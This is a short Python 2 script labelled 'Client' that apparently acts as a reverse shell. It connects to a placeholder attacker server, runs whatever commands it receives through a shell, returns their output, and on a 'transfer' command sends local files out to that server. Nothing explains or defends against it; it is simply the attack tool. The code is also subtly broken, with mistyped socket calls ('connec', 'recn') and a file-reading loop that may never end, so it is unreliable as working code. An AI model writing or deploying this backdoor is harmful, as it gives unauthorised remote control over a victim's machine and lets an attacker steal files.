

### Client ####
import os
import socket
import subprocess


def make_transfer(s, path):
    if os.path.exists(path):
        fd = open(path, 'rb')
        packet = fd.read(1024)
        while packet !='':
            s.send(packet)
            packet = fd.read(1024)
        s.send('DONE')
        fd.close()
    else:
        s.send('File does not exist')
        
        
def get_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connec(('SERVER NAME/IP', SERVER_PORT))
    
    while 1:
        command = s.recn(1024)
        
        if 'terminate' in command:
            s.close()
            break
            
        elif 'transfer' in command:
          transfer, path = command.split('*')
          try:
            make_transfer(s,path)
          except Exception, e:
            s.send( str(e) )
            pass
          
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() )
            s.send( CMD.stderr.read() )
            
def main():
        get_connection()
 

if __name__=='__main__':
    main()


